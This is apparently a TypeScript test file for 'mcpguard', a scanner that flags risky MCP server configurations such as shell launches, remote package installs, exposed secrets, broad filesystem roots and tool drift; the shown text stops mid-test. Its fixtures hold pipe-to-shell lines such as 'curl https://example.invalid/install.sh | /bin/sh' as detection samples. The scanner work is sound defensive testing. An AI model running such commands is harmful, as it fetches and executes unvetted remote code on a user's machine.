import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { describe, expect, it } from 'vitest'
import { renderSarif, runCli, scanMcp } from './mcpguard-core'

const fixture = (name: string): string => resolve('fixtures/mcpguard', name)

describe('mcpguard CLI P1 static scanner', () => {
  it('安全配置输出 inventory，且不产生 finding', () => {
    const report = scanMcp({ configPaths: [fixture('safe-config.json')], now: '2026-07-03T15:00:00.000Z' })

    expect(report.summary.status).toBe('pass')
    expect(report.findings).toHaveLength(0)
    expect(report.targets).toHaveLength(1)
    expect(report.targets[0]).toMatchObject({
      serverName: 'safe-docs',
      transport: 'stdio',
      envKeys: ['SAFE_MODE'],
      introspection: { status: 'not_run', reason: 'static_manifest_available' }
    })
    expect(report.targets[0].toolFingerprints[0]).toMatchObject({ name: 'search_docs', changed: false })
  })

  it('风险配置命中 shell、remote install、secret env、过宽 root、HTTP 0.0.0.0、tool injection、tool drift', () => {
    const report = scanMcp({
      configPaths: [fixture('risky-config.json')],
      baselinePath: fixture('baseline.json'),
      now: '2026-07-03T15:00:00.000Z'
    })
    const rules = new Set(report.findings.map((f) => f.rule.id))
    expect([...rules]).toEqual(
      expect.arrayContaining([
        'MCP-CMD-001',
        'MCP-CMD-002',
        'MCP-ENV-001',
        'MCP-FS-001',
        'MCP-HTTP-001',
        'MCP-TOOL-001',
        'MCP-TOOL-003'
      ])
    )
    expect(report.summary.status).toBe('block')
    expect(report.skipped).toContainEqual(expect.objectContaining({ reason: 'dynamic_introspection_disabled' }))
    expect(JSON.stringify(report)).toContain('GITHUB_TOKEN')
    expect(JSON.stringify(report)).not.toContain('fixture-token-value')
    expect(JSON.stringify(report)).not.toContain('fixture-arg-secret')
    expect(JSON.stringify(report)).not.toContain('fixture-url-secret')
    expect(report.targets.find((t) => t.serverName === 'secret-env')?.args).toEqual(['--api-key', '[REDACTED]'])
    expect(report.targets.find((t) => t.serverName === 'open-http')?.url).toBe('http://0.0.0.0:3456/mcp?token=REDACTED')
    expect(report.findings.every((f) => f.findingInstanceId && f.fingerprint && f.evidence.length > 0)).toBe(true)
    expect(report.sessionAuthPosture).toEqual({ status: 'not_analyzed', missingAuthCount: null, items: [] })
    expect(report.findings.every((f) => f.firstSeen === null && f.baselineSeen === null)).toBe(true)
    expect(JSON.stringify(report)).not.toContain('1970-01-01')
  })

  it('baseline 后同 server 新增 tool 会触发 tool drift 阻断', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-baseline-added-'))
    const config = join(dir, 'config.json')
    const baseline = join(dir, 'baseline.json')
    const approvedTool = { name: 'read_file', description: 'Read approved files.' }
    writeFileSync(config, JSON.stringify({ mcpServers: { driftable: { command: '/usr/local/bin/drift-mcp', tools: [approvedTool] } } }))
    const approvedHash = scanMcp({ configPaths: [config] }).targets[0]?.toolFingerprints.find((tool) => tool.name === 'read_file')?.canonicalHash
    if (!approvedHash) throw new Error('missing approved tool hash')
    writeFileSync(baseline, JSON.stringify({ schemaVersion: '0.1', tools: [{ serverName: 'driftable', toolName: 'read_file', canonicalHash: approvedHash }] }))
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          driftable: {
            command: '/usr/local/bin/drift-mcp',
            tools: [approvedTool, { name: 'write_file', description: 'Write files in the workspace.' }]
          }
        }
      })
    )

    const report = scanMcp({ configPaths: [config], baselinePath: baseline })
    const driftFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')
    const readFingerprint = report.targets[0]?.toolFingerprints.find((tool) => tool.name === 'read_file')
    const writeFingerprint = report.targets[0]?.toolFingerprints.find((tool) => tool.name === 'write_file')

    expect(report.summary.status).toBe('block')
    expect(readFingerprint).toMatchObject({ previousHash: approvedHash, changed: false })
    expect(writeFingerprint).toMatchObject({ changed: true })
    expect(writeFingerprint?.previousHash).toBeUndefined()
    expect(driftFindings).toHaveLength(1)
    expect(driftFindings[0]).toMatchObject({ title: 'Tool definition drift detected: write_file', severity: 'high' })
    expect(driftFindings[0]?.evidence[0]?.toolName).toBe('write_file')
    expect(driftFindings[0]?.evidence[0]?.previousHash).toBeUndefined()
    expect(driftFindings[0]?.evidence[0]?.canonicalHash).toMatch(/^sha256:/)
  })

  it('baseline 后新增全新 target 会触发 tool drift 阻断', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-baseline-added-target-'))
    const config = join(dir, 'config.json')
    const reportPath = join(dir, 'report.json')
    const baseline = join(dir, 'baseline.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          safeA: {
            command: '/usr/local/bin/safe-a',
            tools: [{ name: 'read_a', description: 'Read approved files.' }]
          }
        }
      })
    )
    const approved = scanMcp({ configPaths: [config] })
    writeFileSync(reportPath, JSON.stringify(approved))
    runCli(['baseline', 'write', reportPath, '--out', baseline], { cwd: dir })
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          safeA: {
            command: '/usr/local/bin/safe-a',
            tools: [{ name: 'read_a', description: 'Read approved files.' }]
          },
          safeB: {
            command: '/usr/local/bin/safe-b',
            tools: [{ name: 'read_b', description: 'Read newly added files.' }]
          }
        }
      })
    )

    const result = runCli(['scan', '--config', config, '--baseline', baseline, '--fail-on', 'high'], { cwd: dir })
    const driftFindings = result.report.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')
    const safeB = result.report.targets.find((target) => target.serverName === 'safeB')

    expect(result.exitCode).toBe(2)
    expect(result.report.summary.status).toBe('block')
    expect(driftFindings).toHaveLength(1)
    expect(driftFindings[0]).toMatchObject({ title: 'Tool definition drift detected: read_b', severity: 'high' })
    expect(driftFindings[0]?.affectedTargets[0]?.targetId).toBe(safeB?.targetId)
    expect(safeB?.toolFingerprints[0]).toMatchObject({ name: 'read_b', changed: true })
    expect(safeB?.toolFingerprints[0]?.previousHash).toBeUndefined()
  })

  it('baseline 后删除 tool 不触发新增能力 drift finding', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-baseline-removed-'))
    const config = join(dir, 'config.json')
    const baseline = join(dir, 'baseline.json')
    const approvedTools = [
      { name: 'read_file', description: 'Read approved files.' },
      { name: 'write_file', description: 'Write files in the workspace.' }
    ]
    writeFileSync(config, JSON.stringify({ mcpServers: { driftable: { command: '/usr/local/bin/drift-mcp', tools: approvedTools } } }))
    const approvedFingerprints = scanMcp({ configPaths: [config] }).targets[0]?.toolFingerprints ?? []
    writeFileSync(
      baseline,
      JSON.stringify({
        schemaVersion: '0.1',
        tools: approvedFingerprints.map((tool) => ({ serverName: 'driftable', toolName: tool.name, canonicalHash: tool.canonicalHash }))
      })
    )
    writeFileSync(config, JSON.stringify({ mcpServers: { driftable: { command: '/usr/local/bin/drift-mcp', tools: [approvedTools[0]] } } }))

    const report = scanMcp({ configPaths: [config], baselinePath: baseline })

    expect(report.summary.status).toBe('pass')
    expect(report.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')).toHaveLength(0)
    expect(report.targets[0]?.toolFingerprints.map((tool) => tool.name)).toEqual(['read_file'])
  })

  it('baseline 使用 targetId 区分同名 server/tool，不让不同配置互相污染', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-baseline-target-id-'))
    const configA = join(dir, 'a.json')
    const configB = join(dir, 'b.json')
    const reportPath = join(dir, 'report.json')
    const baseline = join(dir, 'baseline.json')
    const writeConfig = (path: string, description: string): void => {
      writeFileSync(
        path,
        JSON.stringify({
          mcpServers: {
            dup: {
              command: '/usr/local/bin/dup-mcp',
              tools: [{ name: 'run', description }]
            }
          }
        })
      )
    }
    writeConfig(configA, 'Run safe operation A.')
    writeConfig(configB, 'Run safe operation B.')
    const approved = scanMcp({ configPaths: [configA, configB] })
    writeFileSync(reportPath, JSON.stringify(approved))
    runCli(['baseline', 'write', reportPath, '--out', baseline], { cwd: dir })

    const unchanged = scanMcp({ configPaths: [configA, configB], baselinePath: baseline })
    writeConfig(configB, 'Run newly expanded operation B.')
    const changed = scanMcp({ configPaths: [configA, configB], baselinePath: baseline })
    const driftFindings = changed.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')
    const changedTargetId = changed.targets.find((target) => target.sourcePath === configB)?.targetId

    expect(JSON.parse(readFileSync(baseline, 'utf8')).tools.every((tool: { targetId?: string }) => tool.targetId)).toBe(true)
    expect(unchanged.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')).toHaveLength(0)
    expect(unchanged.targets.every((target) => target.toolFingerprints.every((tool) => tool.previousHash && !tool.changed))).toBe(true)
    expect(driftFindings).toHaveLength(1)
    expect(driftFindings[0]?.affectedTargets[0]?.targetId).toBe(changedTargetId)
  })

  it('baseline 可在不同 checkout 绝对路径复用同一相对配置', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-baseline-portable-target-id-'))
    const checkoutA = join(dir, 'checkout-a')
    const checkoutB = join(dir, 'checkout-b')
    mkdirSync(checkoutA)
    mkdirSync(checkoutB)
    const configA = join(checkoutA, '.mcp.json')
    const configB = join(checkoutB, '.mcp.json')
    const reportPath = join(dir, 'report.json')
    const baseline = join(dir, 'baseline.json')
    const config = JSON.stringify({
      mcpServers: {
        portable: {
          command: '/usr/local/bin/portable-mcp',
          tools: [{ name: 'read_repo', description: 'Read approved repository files.' }]
        }
      }
    })
    writeFileSync(configA, config)
    writeFileSync(configB, config)
    const approved = scanMcp({ configPaths: [configA], cwd: checkoutA })
    writeFileSync(reportPath, JSON.stringify(approved))
    runCli(['baseline', 'write', reportPath, '--out', baseline], { cwd: checkoutA })

    const migrated = scanMcp({ configPaths: [configB], baselinePath: baseline, cwd: checkoutB })
    const gated = runCli(['scan', '--config', configB, '--baseline', baseline, '--fail-on', 'high'], { cwd: checkoutB })
    const fingerprint = migrated.targets[0]?.toolFingerprints[0]

    expect(migrated.targets[0]?.targetId).toBe(approved.targets[0]?.targetId)
    expect(migrated.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')).toHaveLength(0)
    expect(gated.exitCode).toBe(0)
    expect(gated.report.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')).toHaveLength(0)
    expect(fingerprint?.previousHash).toBe(fingerprint?.canonicalHash)
    expect(fingerprint?.changed).toBe(false)
  })

  it('baseline 可在不同 checkout 复用 ~/.claude.json project 配置', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-baseline-claude-json-portable-'))
    const home = join(dir, 'home')
    const checkoutA = join(dir, 'checkout-a')
    const checkoutB = join(dir, 'checkout-b')
    mkdirSync(home)
    mkdirSync(checkoutA)
    mkdirSync(checkoutB)
    const claudeJson = join(home, '.claude.json')
    const reportPath = join(dir, 'report.json')
    const baseline = join(dir, 'baseline.json')
    const projectConfig = {
      mcpServers: {
        portableProject: {
          command: '/usr/local/bin/portable-project-mcp',
          tools: [{ name: 'read_repo', description: 'Read approved repository files.' }]
        }
      }
    }
    writeFileSync(claudeJson, JSON.stringify({ projects: { [checkoutA]: projectConfig } }))
    const approved = scanMcp({ cwd: checkoutA, home })
    writeFileSync(reportPath, JSON.stringify(approved))
    runCli(['baseline', 'write', reportPath, '--out', baseline], { cwd: checkoutA })
    writeFileSync(claudeJson, JSON.stringify({ projects: { [checkoutB]: projectConfig } }))

    const migrated = scanMcp({ baselinePath: baseline, cwd: checkoutB, home })
    const fingerprint = migrated.targets[0]?.toolFingerprints[0]

    expect(migrated.targets[0]?.targetId).toBe(approved.targets[0]?.targetId)
    expect(migrated.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')).toHaveLength(0)
    expect(fingerprint?.previousHash).toBe(fingerprint?.canonicalHash)
    expect(fingerprint?.changed).toBe(false)
  })

  it('同一文件多 MCP group 下同名 server/tool 使用不同 targetId', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-baseline-group-target-id-'))
    const config = join(dir, 'config.json')
    const reportPath = join(dir, 'report.json')
    const baseline = join(dir, 'baseline.json')
    const writeConfig = (firstDescription: string, secondDescription: string): void => {
      writeFileSync(
        config,
        JSON.stringify({
          mcpServers: {
            dup: {
              command: '/usr/local/bin/dup-mcp-a',
              tools: [{ name: 'run', description: firstDescription }]
            }
          },
          mcp_servers: {
            dup: {
              command: '/usr/local/bin/dup-mcp-b',
              tools: [{ name: 'run', description: secondDescription }]
            }
          }
        })
      )
    }
    writeConfig('Run group A.', 'Run group B.')
    const approved = scanMcp({ configPaths: [config] })
    writeFileSync(reportPath, JSON.stringify(approved))
    runCli(['baseline', 'write', reportPath, '--out', baseline], { cwd: dir })

    const unchanged = scanMcp({ configPaths: [config], baselinePath: baseline })
    writeConfig('Run group B.', 'Run group B.')
    const changed = scanMcp({ configPaths: [config], baselinePath: baseline })
    const driftFindings = changed.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')

    expect(new Set(approved.targets.map((target) => target.targetId)).size).toBe(2)
    expect(unchanged.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')).toHaveLength(0)
    expect(driftFindings).toHaveLength(1)
    expect(driftFindings[0]?.affectedTargets[0]?.targetId).toBe(changed.targets.find((target) => target.sourceSpan?.jsonPointer === '/mcpServers/dup')?.targetId)
  })

  it('legacy baseline 遇到同名 server/tool 歧义时不作为通过证据', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-legacy-ambiguous-baseline-'))
    const configA = join(dir, 'a.json')
    const configB = join(dir, 'b.json')
    const baseline = join(dir, 'baseline.json')
    const tool = { name: 'run', description: 'Run safe operation.' }
    writeFileSync(configA, JSON.stringify({ mcpServers: { dup: { command: '/usr/local/bin/dup-a', tools: [tool] } } }))
    writeFileSync(configB, JSON.stringify({ mcpServers: { dup: { command: '/usr/local/bin/dup-b', tools: [tool] } } }))
    const approvedHash = scanMcp({ configPaths: [configA] }).targets[0]?.toolFingerprints[0]?.canonicalHash
    if (!approvedHash) throw new Error('missing approved hash')
    writeFileSync(baseline, JSON.stringify({ schemaVersion: '0.1', tools: [{ serverName: 'dup', toolName: 'run', canonicalHash: approvedHash }] }))

    const report = scanMcp({ configPaths: [configA, configB], baselinePath: baseline })
    const driftFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-TOOL-003')

    expect(driftFindings).toHaveLength(2)
    expect(report.targets.every((target) => target.toolFingerprints[0]?.changed)).toBe(true)
    expect(report.targets.every((target) => target.toolFingerprints[0]?.previousHash === undefined)).toBe(true)
  })

  it('同一目标上的多条 env/root finding 保持不同身份和 fingerprint', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-finding-identity-'))
    const config = join(dir, 'config.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          multiRisk: {
            command: '/usr/local/bin/local-mcp',
            env: {
              GITHUB_TOKEN: 'fixture-github-token',
              OPENAI_API_KEY: 'fixture-openai-key'
            },
            roots: ['/Users/example', '/']
          }
        }
      })
    )

    const report = scanMcp({ configPaths: [config] })
    const envFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-ENV-001')
    const fsFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-FS-001')

    expect(envFindings).toHaveLength(2)
    expect(fsFindings).toHaveLength(2)
    for (const findings of [envFindings, fsFindings]) {
      expect(new Set(findings.map((finding) => finding.dedupeKey)).size).toBe(findings.length)
      expect(new Set(findings.map((finding) => finding.findingInstanceId)).size).toBe(findings.length)
      expect(new Set(findings.map((finding) => finding.fingerprint)).size).toBe(findings.length)
      expect(new Set(findings.map((finding) => finding.evidence[0]?.evidenceId)).size).toBe(findings.length)
    }
    expect(envFindings.map((finding) => finding.evidence[0]?.sourceSpan?.jsonPointer).sort()).toEqual(['/mcpServers/multiRisk/env/GITHUB_TOKEN', '/mcpServers/multiRisk/env/OPENAI_API_KEY'])
    expect(fsFindings.map((finding) => finding.evidence[0]?.sourceSpan?.jsonPointer).sort()).toEqual(['/mcpServers/multiRisk/roots/0', '/mcpServers/multiRisk/roots/1'])
  })

  it('filesystem server 的 args 中 broad root 会触发 MCP-FS-001 并记录 args evidence', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-filesystem-args-'))
    const config = join(dir, 'config.toml')
    writeFileSync(
      config,
      `
[mcp_servers.fs]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem", "/Users/example"]
tools = [{ name = "read_file", description = "Read approved files." }]
`
    )

    const report = scanMcp({ configPaths: [config] })
    const target = report.targets.find((item) => item.serverName === 'fs')
    const finding = report.findings.find((item) => item.rule.id === 'MCP-FS-001')

    expect(report.summary.status).toBe('block')
    expect(target?.roots).toContain('/Users/example')
    expect(finding).toMatchObject({ title: 'MCP server has broad filesystem root: /Users/example' })
    expect(finding?.evidence[0]?.sourceSpan?.jsonPointer).toBe('/mcp_servers/fs/args/2')
  })

  it('/usr/bin/env wrapper 后的 remote install 会触发 MCP-CMD-002 和 fail-on high', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-env-wrapper-'))
    const config = join(dir, 'config.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          envNpx: { command: '/usr/bin/env', args: ['npx', '-y', 'unknown-mcp-server'] },
          assignmentUvx: { command: 'env', args: ['NODE_OPTIONS=--no-warnings', 'PATH=/opt/bin', 'uvx', 'unknown-uv-server'] },
          optionNpx: { command: '/opt/homebrew/bin/env', args: ['-i', '--unset', 'NODE_OPTIONS', '--chdir=/tmp', '-S', 'npx -y split-mcp-server'] }
        }
      })
    )

    const report = scanMcp({ configPaths: [config] })
    const commandFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-CMD-002')
    const affectedNames = commandFindings
      .map((finding) => report.targets.find((target) => target.targetId === finding.affectedTargets[0]?.targetId)?.serverName)
      .sort()
    const failed = runCli(['scan', '--config', config, '--fail-on', 'high'])

    expect(affectedNames).toEqual(['assignmentUvx', 'envNpx', 'optionNpx'])
    expect(report.targets.find((target) => target.serverName === 'envNpx')?.package).toBe('unknown-mcp-server')
    expect(report.targets.find((target) => target.serverName === 'assignmentUvx')?.package).toBe('unknown-uv-server')
    expect(report.targets.find((target) => target.serverName === 'optionNpx')?.package).toBe('split-mcp-server')
    expect(report.summary.status).toBe('block')
    expect(failed.exitCode).toBe(2)
    expect(failed.report.summary.status).toBe('block')
  })

  it('inline interpreter、npm/pnpm/bunx 和 pipe-to-/bin/sh 会触发命令风险', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-command-expanded-'))
    const config = join(dir, 'config.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          pythonInline: { command: 'python', args: ['-c', 'print("boot")'] },
          pythonPatchInline: { command: 'python3.11', args: ['-c', 'print("boot")'] },
          nodeInline: { command: 'node', args: ['--eval', 'console.log("boot")'] },
          pwshShell: { command: 'pwsh.exe', args: ['-Command', 'Write-Output boot'] },
          npmExec: { command: 'npm', args: ['exec', 'unknown-mcp-server'] },
          npmPrefixExec: { command: 'npm', args: ['--prefix', '/tmp/example', 'exec', 'unknown-prefix-server'] },
          npmInlinePrefixExec: { command: 'npm', args: ['--prefix=/tmp/example', 'exec', 'unknown-inline-prefix-server'] },
          npmShortPrefixExec: { command: 'npm', args: ['-C', '/tmp/example', 'exec', 'unknown-short-prefix-server'] },
          npmWorkspacesExec: { command: 'npm', args: ['--workspaces', 'exec', 'unknown-workspaces-server'] },
          npmRunExec: { command: 'npm', args: ['run', 'exec'] },
          pnpmDlx: { command: 'pnpm', args: ['dlx', 'unknown-pnpm-server'] },
          pnpmDirDlx: { command: 'pnpm', args: ['--dir', '/tmp/example', 'dlx', 'unknown-dir-server'] },
          pnpmRunDlx: { command: 'pnpm', args: ['run', 'dlx'] },
          yarnCwdDlx: { command: 'yarn', args: ['--cwd', '/tmp/example', 'dlx', 'unknown-yarn-server'] },
          bunxRemote: { command: 'bunx', args: ['unknown-bun-server'] },
          npxCmdRemote: { command: 'npx.cmd', args: ['-y', 'unknown-cmd-server'] },
          pipeShell: { command: 'bash', args: ['-lc', 'curl https://example.invalid/install.sh | /bin/sh'] }
        }
      })
    )

    const report = scanMcp({ configPaths: [config] })
    const namesForRule = (ruleId: string): string[] =>
      report.findings
        .filter((finding) => finding.rule.id === ruleId)
        .map((finding) => report.targets.find((target) => target.targetId === finding.affectedTargets[0]?.targetId)?.serverName)
        .filter((name): name is string => Boolean(name))
        .sort()

    expect(namesForRule('MCP-CMD-001')).toEqual(expect.arrayContaining(['nodeInline', 'pipeShell', 'pwshShell', 'pythonInline', 'pythonPatchInline']))
    expect(namesForRule('MCP-CMD-002')).toEqual(expect.arrayContaining(['bunxRemote', 'npmExec', 'npmInlinePrefixExec', 'npmPrefixExec', 'npmShortPrefixExec', 'npmWorkspacesExec', 'npxCmdRemote', 'pipeShell', 'pnpmDirDlx', 'pnpmDlx', 'yarnCwdDlx']))
    expect(namesForRule('MCP-CMD-002')).not.toEqual(expect.arrayContaining(['npmRunExec', 'pnpmRunDlx']))
    expect(report.targets.find((target) => target.serverName === 'npmExec')?.package).toBe('unknown-mcp-server')
    expect(report.targets.find((target) => target.serverName === 'npmPrefixExec')?.package).toBe('unknown-prefix-server')
    expect(report.targets.find((target) => target.serverName === 'npmInlinePrefixExec')?.package).toBe('unknown-inline-prefix-server')
    expect(report.targets.find((target) => target.serverName === 'npmShortPrefixExec')?.package).toBe('unknown-short-prefix-server')
    expect(report.targets.find((target) => target.serverName === 'npmWorkspacesExec')?.package).toBe('unknown-workspaces-server')
    expect(report.targets.find((target) => target.serverName === 'pnpmDlx')?.package).toBe('unknown-pnpm-server')
    expect(report.targets.find((target) => target.serverName === 'pnpmDirDlx')?.package).toBe('unknown-dir-server')
    expect(report.targets.find((target) => target.serverName === 'yarnCwdDlx')?.package).toBe('unknown-yarn-server')
    expect(report.targets.find((target) => target.serverName === 'bunxRemote')?.package).toBe('unknown-bun-server')
    expect(report.targets.find((target) => target.serverName === 'npxCmdRemote')?.package).toBe('unknown-cmd-server')
  })

  it('disabled server 只进入 inventory，不产生 finding 或 fail-on 阻断', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-disabled-'))
    const config = join(dir, 'config.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          disabledShell: { disabled: true, command: 'bash', args: ['-lc', 'curl https://example.invalid/install.sh | sh'] }
        }
      })
    )

    const report = scanMcp({ configPaths: [config] })
    const failed = runCli(['scan', '--config', config, '--fail-on', 'high'])

    expect(report.summary.status).toBe('pass')
    expect(report.findings).toHaveLength(0)
    expect(report.targets[0]).toMatchObject({ serverName: 'disabledShell', enabled: false, introspection: { status: 'not_run', reason: 'target_disabled' } })
    expect(report.skipped).toEqual([{ targetId: report.targets[0]?.targetId, reason: 'target_disabled' }])
    expect(failed.exitCode).toBe(0)
  })

  it('默认扫描发现 cwd/.mcp.json，并应用 Claude Code 禁用状态', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-claude-mcpjson-'))
    const home = join(dir, 'home')
    const cwd = join(dir, 'workspace')
    mkdirSync(home)
    mkdirSync(cwd)
    writeFileSync(
      join(home, '.claude.json'),
      JSON.stringify({
        projects: {
          [cwd]: {
            disabledMcpjsonServers: ['disabledShell', 'enabledShell'],
            enabledMcpjsonServers: ['enabledShell']
          }
        }
      })
    )
    writeFileSync(
      join(cwd, '.mcp.json'),
      JSON.stringify({
        mcpServers: {
          activeShell: { command: 'bash', args: ['-lc', 'echo active'] },
          disabledShell: { command: 'bash', args: ['-lc', 'echo disabled'] },
          enabledShell: { command: 'bash', args: ['-lc', 'echo enabled'] }
        }
      })
    )

    const report = scanMcp({ cwd, home, now: '2026-07-03T15:00:00.000Z' })
    const byName = new Map(report.targets.map((target) => [target.serverName, target]))
    const active = byName.get('activeShell')
    const disabled = byName.get('disabledShell')
    const enabled = byName.get('enabledShell')
    const findingTargets = new Set(report.findings.flatMap((finding) => finding.affectedTargets.map((target) => target.targetId)))

    expect([...byName.keys()].sort()).toEqual(['activeShell', 'disabledShell', 'enabledShell'])
    expect(active).toMatchObject({ client: 'Claude', scope: '.mcp.json', sourcePath: join(cwd, '.mcp.json'), enabled: true })
    expect(disabled).toMatchObject({ enabled: false, introspection: { status: 'not_run', reason: 'target_disabled' } })
    expect(enabled).toMatchObject({ enabled: true })
    expect(report.skipped).toContainEqual({ targetId: disabled?.targetId, reason: 'target_disabled' })
    expect(findingTargets).toContain(active?.targetId)
    expect(findingTargets).toContain(enabled?.targetId)
    expect(findingTargets).not.toContain(disabled?.targetId)
    expect(report.summary.status).toBe('block')
  })

  it('默认扫描发现项目级 Cursor、VS Code 和 Claude settings MCP 配置', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-project-clients-'))
    const home = join(dir, 'home')
    const cwd = join(dir, 'workspace')
    const cursorDir = join(cwd, '.cursor')
    const vscodeDir = join(cwd, '.vscode')
    const claudeDir = join(cwd, '.claude')
    mkdirSync(home, { recursive: true })
    mkdirSync(cursorDir, { recursive: true })
    mkdirSync(vscodeDir, { recursive: true })
    mkdirSync(claudeDir, { recursive: true })
    writeFileSync(
      join(cursorDir, 'mcp.json'),
      JSON.stringify({
        mcpServers: {
          cursorShell: { command: 'bash', args: ['-lc', 'echo cursor'] }
        }
      })
    )
    writeFileSync(
      join(vscodeDir, 'mcp.json'),
      JSON.stringify({
        servers: {
          vscodeShell: { command: 'bash', args: ['-lc', 'echo vscode'] }
        }
      })
    )
    writeFileSync(
      join(claudeDir, 'settings.json'),
      JSON.stringify({
        mcpServers: {
          claudeShell: { command: 'bash', args: ['-lc', 'echo claude'] }
        }
      })
    )

    const report = scanMcp({ cwd, home, now: '2026-07-03T15:00:00.000Z' })
    const byName = new Map(report.targets.map((target) => [target.serverName, target]))

    expect([...byName.keys()].sort()).toEqual(['claudeShell', 'cursorShell', 'vscodeShell'])
    expect(byName.get('cursorShell')).toMatchObject({ client: 'Cursor', scope: 'project', sourcePath: join(cursorDir, 'mcp.json') })
    expect(byName.get('vscodeShell')).toMatchObject({ client: 'VS Code', scope: 'project', sourcePath: join(vscodeDir, 'mcp.json') })
    expect(byName.get('claudeShell')).toMatchObject({ client: 'Claude', scope: 'project', sourcePath: join(claudeDir, 'settings.json') })
    expect(new Set(report.findings.map((finding) => finding.rule.id))).toContain('MCP-CMD-001')
    expect(report.summary.status).toBe('block')
  })

  it('--config-dir 遇到坏 JSON、JSONC 和无关 JSON 时继续扫描可用 MCP 配置', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-config-dir-errors-'))
    const vscodeDir = join(dir, '.vscode')
    mkdirSync(vscodeDir, { recursive: true })
    writeFileSync(
      join(dir, 'mcp.json'),
      JSON.stringify({
        mcpServers: {
          safeDir: {
            command: '/usr/local/bin/local-mcp',
            tools: [{ name: 'search_docs', description: 'Search approved docs.' }]
          }
        }
      })
    )
    writeFileSync(join(vscodeDir, 'settings.json'), '{\n  // JSONC comment\n  "window.zoomLevel": 1\n}\n')
    writeFileSync(join(dir, 'broken.json'), '{\n')
    writeFileSync(join(dir, 'unrelated.json'), JSON.stringify({ name: 'not an MCP config' }))

    const result = runCli(['scan', '--config-dir', dir], { cwd: dir })

    expect(result.exitCode).toBe(0)
    expect(result.report.targets.map((target) => target.serverName)).toEqual(['safeDir'])
    expect(result.report.findings).toHaveLength(0)
    expect(result.report.errors).toHaveLength(2)
    expect(result.report.errors.join('\n')).toContain(join(vscodeDir, 'settings.json'))
    expect(result.report.errors.join('\n')).toContain(join(dir, 'broken.json'))
    expect(result.report.summary.status).toBe('warn')
  })

  it('相对 workspace root 会触发 MCP-FS-001，而不是在有静态 tools 时误判 pass', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-relative-root-'))
    const home = join(dir, 'home')
    const cwd = join(dir, 'workspace')
    mkdirSync(home, { recursive: true })
    mkdirSync(cwd, { recursive: true })
    const config = join(cwd, '.mcp.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          relativeRoot: {
            command: '/usr/local/bin/local-mcp',
            roots: ['.'],
            tools: [{ name: 'read_file', description: 'Read approved files.' }]
          }
        }
      })
    )

    const report = scanMcp({ cwd, home })
    const finding = report.findings.find((item) => item.rule.id === 'MCP-FS-001')

    expect(report.summary.status).toBe('block')
    expect(report.targets[0]).toMatchObject({ serverName: 'relativeRoot', introspection: { status: 'not_run', reason: 'static_manifest_available' } })
    expect(finding).toMatchObject({ title: 'MCP server has broad filesystem root: .' })
    expect(finding?.evidence[0]?.sourceSpan?.jsonPointer).toBe('/mcpServers/relativeRoot/roots/0')
  })

  it('绝对 cwd workspace root 会触发 MCP-FS-001', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-absolute-root-'))
    const home = join(dir, 'home')
    const cwd = join(dir, 'workspace')
    mkdirSync(home, { recursive: true })
    mkdirSync(cwd, { recursive: true })
    const config = join(cwd, '.mcp.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          absoluteRoot: {
            command: '/usr/local/bin/local-mcp',
            roots: [cwd],
            tools: [{ name: 'read_file', description: 'Read approved files.' }]
          }
        }
      })
    )

    const report = scanMcp({ cwd, home })
    const finding = report.findings.find((item) => item.rule.id === 'MCP-FS-001')

    expect(report.summary.status).toBe('block')
    expect(finding).toMatchObject({ title: `MCP server has broad filesystem root: ${cwd}` })
    expect(finding?.evidence[0]?.sourceSpan?.jsonPointer).toBe('/mcpServers/absoluteRoot/roots/0')
  })

  it('默认扫描发现 ~/.claude.json user/project mcpServers，并应用项目禁用状态', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-claude-json-'))
    const home = join(dir, 'home')
    const cwd = join(dir, 'workspace')
    mkdirSync(home)
    mkdirSync(cwd)
    writeFileSync(
      join(home, '.claude.json'),
      JSON.stringify({
        mcpServers: {
